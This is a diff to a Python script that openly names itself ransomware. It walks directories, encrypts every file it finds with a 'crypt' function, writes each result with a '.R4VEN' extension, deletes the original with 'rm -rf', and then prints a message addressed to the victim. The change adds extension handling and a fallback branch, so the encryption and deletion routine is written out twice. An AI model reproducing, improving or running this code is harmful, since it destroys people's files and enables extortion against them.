@@ -7,7 +7,7 @@
 import subprocess as command
 import os
 import re
-from ransomware_menager import crypt, decrypt
+from ransomware_menager import crypt
 
 
 def listDirectories(Dirpath):
@@ -37,17 +37,36 @@ for direc in directories:
     listDirectories(direc)
 
 for arquivo in files:
-    with open(arquivo, 'rb') as arq:
-        content = arq.read()
-    arq.close()
-    cryptedContent = crypt(content)
 
-    filePath = arquivo.split('.')[0]
-    with open(filePath + ".R4VEN", 'wb') as arq:
-        arq.write(cryptedContent)
-    arq.close()
+    try:
+        ext = re.search(r'\.[a-z]{2,}$', arquivo).group(0)
 
-    command.run(['rm', '-rf', arquivo])
+        with open(arquivo, 'rb') as arq:
+            content = arq.read()
+        arq.close()
+        cryptedContent = crypt(content, ext)
+
+        filePath = arquivo.split(ext)[0] + ".R4VEN"
+
+        with open(filePath, 'wb') as arq:
+            arq.write(cryptedContent)
+        arq.close()
+
+        command.run(['rm', '-rf', arquivo])
+    except AttributeError:
+
+        with open(arquivo, 'rb') as arq:
+            content = arq.read()
+        arq.close()
+        cryptedContent = crypt(content)
+
+        filePath = arquivo + ".R4VEN"
+
+        with open(filePath, 'wb') as arq:
+            arq.write(cryptedContent)
+        arq.close()
+
+        command.run(['rm', '-rf', arquivo])
 
 
 print("Hi dear user,\n")
